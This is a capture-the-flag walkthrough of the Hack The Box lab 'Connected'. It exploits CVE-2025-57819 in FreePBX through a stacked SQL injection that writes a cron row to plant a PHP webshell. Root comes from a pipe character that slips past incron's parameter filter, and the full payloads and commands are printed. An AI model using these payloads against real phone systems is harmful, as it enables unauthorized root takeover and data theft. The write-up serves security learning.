# Walkthrough: Connected (HTB #906)

**Status: PWNED — user + root, 2026-08-29** ✅

- **Target:** `10.129.245.100` (our own spawned lab instance)
- **Flags:** user `ecdd0d…` · root `f42848…` (both submitted and accepted;
  full values live in [../flags.log](../flags.log))
- **Attack chain in one sentence:** a SQL injection in FreePBX's AJAX handler let
  us *write* a row into the app's own cron table — the app then planted our
  webshell for us — and a root-triggered hook runner that filtered almost every
  dangerous character forgot about the pipe `|`, which handed us root.

---

## Setting the scene: what is this box?

The target runs **FreePBX 16.0.40.7** (by Sangoma). In plain terms, FreePBX is
**the web control panel for a phone system** — it sits on top of Asterisk (the
actual open-source PBX software that routes calls) and gives administrators a
point-and-click interface for extensions, voicemail, call routing, and so on.

Why attackers care: a PBX web panel is a big, old, PHP codebase with deep system
access (it has to rewrite configs and restart phone services), which makes it a
rich hunting ground.

The stack, as fingerprinted:

| Layer | Version |
|---|---|
| OS | CentOS 7 |
| Web server | Apache 2.4.6 |
| Language | PHP 7.4.16 |
| TLS library | OpenSSL 1.0.2k-fips |
| SSH | OpenSSH 7.4 (banner only) |
| FreePBX | **16.0.40.7** (confirmed via `load_version=` asset params and the footer on `/admin/config.php`) |
| UCP module | 16.0.38.1 (the "User Control Panel" at `/ucp/`) |

---

## The vhost discovery — why asking by name matters

Our very first request to the bare IP got a **301 redirect** to
`http://connected.htb/`. That redirect is the server telling us: *"I host
websites, but I only show the real one if you ask for it by name."*

This is **virtual hosting (vhosts)**: one server, one IP address, potentially
many websites — the web server picks which site to serve based on the `Host`
header (the domain name) in your request. Think of an apartment building: the
street address gets you to the front door, but you need the tenant's *name* to
reach the right apartment.

We also pulled a second name, **`pbxconnect`**, from the TLS certificate's
Common Name field (`emailAddress=root@pbxconnect`) — likely the machine's
internal hostname.

To ask by name, the name has to resolve to the IP, so it goes in `/etc/hosts`:

```bash
# /etc/hosts — tells our machine "these names live at this IP"
10.129.245.100 connected.htb pbxconnect
```

(Our `sudo` needed a password that session, so as a workaround we used
`curl --resolve connected.htb:80:10.129.245.100`, which pins the name → IP
mapping for a single request without editing any files.)

---

## Enumeration findings

Single, targeted requests only — no noisy wordlist scanning needed:

| Endpoint | Result | Why it matters |
|---|---|---|
| `/` (port 80, by IP) | 301 → `http://connected.htb/` | The vhost discovery above |
| `/admin/config.php` | 200 | **FreePBX admin login page** |
| `/ucp/` | 200 | **UCP login** (the end-user panel), module v16.0.38.1 |
| `/admin/ajax.php` | 403 `{"error":"ajaxRequest declined"}` | FreePBX's AJAX handler — **the entry point for CVE-2025-57819**. A 403 here is *expected* and confirms the handler exists |
| `/admin/cxpanel/` | 200, "Offline system!" | iSymphony panel installed but its service (port 58080) is down — historically buggy software, low priority while offline |
| `/robots.txt` | 200, `Disallow: /` | Stock FreePBX file, nothing hidden |
| `/server-status`, `/.git/HEAD`, `/.env`, `/phpinfo.php`, backups, `/recordings/`… | 404 | Nothing carelessly exposed |

Two smaller observations worth remembering:

- **Login probing was quiet.** A single-quote `'` in the username field (the
  classic first SQL-injection poke) produced byte-identical pages on both login
  forms — no error leakage. UCP failed logins are also artificially *slow*
  (~1–2 minutes), making brute force impractical.
- **Info leak:** the UCP footer discloses an internal IP, `10.10.15.143` —
  useless now, gold if we ever pivot inside.

---

## The suspect: CVE-2025-57819

**CVE-2025-57819** is a critical vulnerability in FreePBX's commercial
**endpoint module** (the piece that auto-provisions desk phones): an
unauthenticated attacker can reach a **SQL injection (SQLi)** through
`/admin/ajax.php`, and from there escalate to remote code execution.
(Advisory: GHSA-m42g-xg4c-5f3h, published 2025-08-28 — and exploited in the
wild within days.)

Why we liked our odds, and were right:

- Our target was FreePBX **16.0.40.7**; the bug affects the endpoint module
  **below 16.0.89** on FreePBX 16. The version was far below the patch.
- `/admin/ajax.php` was present and behaved exactly as the research describes.

Reminder of the term: **SQLi** means tricking the app into running *our*
database commands by feeding it crafted input — like writing "…and also hand me
the master key" into a form's special-instructions field, and the kitchen obeys.

---

## Stage 3 — Foothold: the app plants our shell for us

### Confirming the injection

First we proved the `brand` parameter was injectable, with the two-request
fingerprint:

```
brand=x'       →  SQL syntax error page   (our quote broke the query)
brand=x' --    →  normal response again   (our comment glued it back together)
```

Breaking it, then fixing it with a comment, is the classic "yes, this is SQLi"
signal: the parameter is being pasted raw into a database query.

### The exploit: a stacked query that writes

Most people hear "SQL injection" and think *reading* data — dumping tables of
usernames and passwords. This one was a **stacked query** injection, meaning we
could tack an entire *second* SQL statement onto the first. And our second
statement wasn't a `SELECT` — it was an `INSERT`. **We didn't steal data; we
gave the database new orders.**

The target of those orders is what makes this chain elegant. FreePBX keeps its
own scheduled-task list in a database table called `cron_jobs`, and a system
**cron** daemon (Linux's built-in "run this on a schedule" service) reads that
table and executes whatever it finds. So a database write silently becomes a
scheduled command:

```python
# from loot/exploit.py — the injected second statement:
"';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) "
"VALUES ('sysadmin','<jobname>','echo \"<b64 webshell>\"|base64 -d >/var/www/html/<shell>.php',NULL,'* * * * *',30,1,1) -- "
```

Line by line, in plain English:

- `';` — close out the legitimate query and start our own statement.
- `INSERT INTO cron_jobs … VALUES ('sysadmin','<jobname>', …)` — add a brand-new
  scheduled task to FreePBX's own task list, with a random unique name.
- The command: `echo "<b64>" | base64 -d > /var/www/html/<shell>.php` — decode a
  base64 blob and write it into the webroot. The blob is a one-line PHP
  **webshell**: `<?php system($_GET['cmd']); ?>` — "run whatever command arrives
  in the `cmd` URL parameter."
- `'* * * * *'` — cron-speak for "every minute."
- `-- ` — comment out the rest of the original query so our statement runs clean.

Then we just… waited. Within about a minute or two, FreePBX's own cron woke up,
saw our row, and obediently dropped our webshell into `/var/www/html/`. The
exploit polls until the shell answers:

```python
resp = requests.get(shell_url + "?cmd=id", verify=False, timeout=10)
if resp.status_code == 200 and "uid=" in resp.text:
    print("[+] WEBSHELL UP")   # uid=999(asterisk) gid=1000(asterisk)
```

**Why this is beautiful (and worth internalizing):** we never touched the web
server directly. The vulnerability wasn't that we could *read* the database —
it's that the SQLi could **write**, and the database **drove a cron daemon**.
The application attacked itself: our row looked exactly like a legitimate
FreePBX scheduled task, so every defensive layer between "web request" and
"command execution" was the app's *own* machinery working as designed. When a
system turns your data into its own instructions, you don't break down the door —
you hand the doorman a forged work order.

Afterwards, a second injected statement (`DELETE FROM cron_jobs WHERE
jobname='<jobname>'`) removed our row so it wouldn't keep re-dropping the shell.

## Stage 4 — User flag

With the webshell running commands as the **asterisk** user:

```bash
curl -k "https://10.129.245.100/<shell>.php?cmd=cat+/home/asterisk/user.txt"
```

User flag captured and submitted ✅.

---

## Stage 5 — Root: the pipe that the filter forgot

This privesc is the real teacher on this box, because **the "expected" exploit
failed — twice — and the win came from reading the system more honestly than its
own author did.**

### The machinery: incron + sysadmin_manager

From enumeration (`loot/privesc-enum.txt`):

```
# /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

In plain English: **incron** ("cron, but triggered by file *events* instead of
time") watches the directory `/var/spool/asterisk/incron/`. The moment any file
there is written, it runs `sysadmin_manager <filename>` — **as root**. And the
watched directory is writable by *us*, the asterisk user. Writable by us +
executed by root is the shape privesc dreams are made of.

`sysadmin_manager` (a PHP script) treats a trigger file named
`module.hook.CONTENTS` specially: it reads up to 4KB of the file's *content* into
a `$params` string, verifies the hook's cryptographic signature, then runs:

```php
system("$hookfile $params");   // executes via sh -c — i.e., a real shell
```

### Failed path #1: forge the signature

The "textbook" attack is to tamper with a hook and fix up its SHA256 signature
in the writable `module.sig` file — and when we tested the signature check
manually **as asterisk**, it was lenient enough to accept that. But the root-side
check is different code: root's `sysadmin_manager` validates through a GPG
routine hidden inside **IonCube-encoded** PHP (encrypted/obfuscated commercial
PHP — you can't just read or patch it), and it *rejects* tampered or
non-whitelisted signatures. Same feature, two different judges. Dead end.

### Failed path #2: the race

Next idea: a **TOCTOU race** (time-of-check to time-of-use). The plan: give the
checker a valid signed file, then swap in our evil file in the split-second
*between* "signature verified" and "file executed" — like swapping an envelope
after the mailroom stamps it but before it's opened. We built a little C program
flipping a link back and forth and triggered it hundreds of times. **We never
won the race.** Races are probabilistic — you're buying lottery tickets, and the
odds here were terrible.

### The winning path: one unfiltered character

So we stopped attacking the signature and re-read what the system *does* trust:
it happily runs a **legitimately signed** hook — it just appends *our file's
content* as parameters. The parameter filter blocklists the usual shell
metacharacters:

```
`  '  "  $  >  <  &  ;      ← all rejected
```

…but **not the pipe `|`**. And `system()` runs through `sh -c`, a real shell,
where `|` chains commands. So the bouncer pats down every word on the guest list
for weapons — but nobody ever told him "pipe" could chain two commands together.

The exploit, in two files:

```bash
# 1. Our payload, in the SHARED webroot (why not /tmp — see below):
#    /var/www/html/.evil.sh
#!/bin/bash
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
cp /bin/bash /var/www/html/.rb && chmod 4755 /var/www/html/.rb  # SUID-root bash copy
cat /root/root.txt > /var/www/html/.rf                          # exfil the flag to the webroot

# 2. The trigger file, dropped into the incron-watched directory:
echo 'x | /var/www/html/.evil.sh' > /var/spool/asterisk/incron/core.logrotate.CONTENTS
```

The instant that trigger file lands, incron fires and root executes:

```
system("/…/core/hooks/logrotate x | /var/www/html/.evil.sh")
```

The shell reads that as: run the (validly signed, completely unmodified)
`logrotate` hook, and **pipe its output into our script** — which means our
script runs, as root. No signature forgery, no race, no tampering with anything
Sangoma signed. The *legitimate* hook was the vehicle; we just appended a second
command to its invitation.

### The /tmp gotcha: two rooms with the same label

Our first payload lived at `/tmp/evil.sh` — and root swore it didn't exist. The
reason: the incron service runs with **PrivateTmp**, a Linux feature that gives a
service its own *private* `/tmp`, invisible to everyone else. Picture two rooms
both labeled "/tmp" on their doors: we put our file in the public one, root
walked into its private one, and each was invisible from the other. The fix was
to use a directory both sides genuinely share — the webroot `/var/www/html/` —
for the payload *and* the output files.

## Stage 6 — Root flag and cleanup

The trigger fired; moments later the webroot held our prizes:

```bash
ls -l /var/www/html/.rb
# -rwsr-xr-x root root …   ← a copy of bash with the SUID bit: runs as root for whoever executes it

/var/www/html/.rb -p -c id
# uid=999(asterisk) gid=1000(asterisk) euid=0(root)   ← effective root ✅

cat /var/www/html/.rf     # the root flag, exfiltrated by the payload
```

Root flag submitted → "Connected root is now owned", `machine_pwned: true`.
**BOX COMPLETE.** Afterwards we cleaned up: the injected cron row was deleted
via the same SQLi, the webshell and root-side payloads (`.rb`, `.rf`, `.evil.sh`,
trigger files) were removed, and the hook/signature files were left untouched —
the whole root path worked *without* modifying any signed component.

---

## Lessons to remember

> 1. **Blocklist filters almost always miss one.** Eight dangerous characters
>    were blocked; the ninth (`|`) was root. When you see a filter, don't ask
>    "what does it block?" — ask "what does it *allow*?"
> 2. **When the expected path fails, enumerate what the system DOES trust.**
>    We couldn't forge a signature or win a race — but the system *already
>    trusted* the signed hooks, and it appended our input to them. The injection
>    point was *around* the trust, not inside it.
> 3. **Races are probabilistic; prefer deterministic vectors.** Hundreds of
>    TOCTOU attempts won nothing; one crafted filename won immediately. If an
>    exploit needs luck, keep looking for one that doesn't.
> 4. **Writable by you + executed by root = privesc.** An asterisk-writable
>    directory watched by a root incron job was the whole ballgame. On every
>    box, map that intersection first.
> 5. **A write-capable SQLi is code execution looking for a scheduler.** The
>    database wasn't the loot — it was the delivery mechanism into cron.
> 6. **Version fingerprinting decides everything** — again. One footer version
>    number (`16.0.40.7`) plus a public advisory turned an unknown black box
>    into a mapped attack path before we sent a single malicious packet.
